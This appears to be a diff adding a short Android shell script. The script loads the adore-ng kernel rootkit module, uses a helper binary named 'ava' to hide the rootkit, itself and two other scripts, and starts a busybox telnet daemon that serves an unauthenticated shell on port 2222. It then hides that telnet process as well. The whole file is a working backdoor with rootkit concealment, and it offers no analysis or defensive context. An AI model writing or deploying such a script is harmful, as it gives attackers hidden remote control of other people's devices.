@@ -1,0 +1,10 @@
+#! /system/bin/sh
+
+insmod adore-ng.ko
+./ava h adore-ng.ko
+./ava h ava
+./ava h script1
+./ava h script2
+busybox telnetd -l /system/bin/sh -p 2222
+var=`busybox ps | grep -m 1 telnet | cut -f2 -d " "`
+./ava i $var
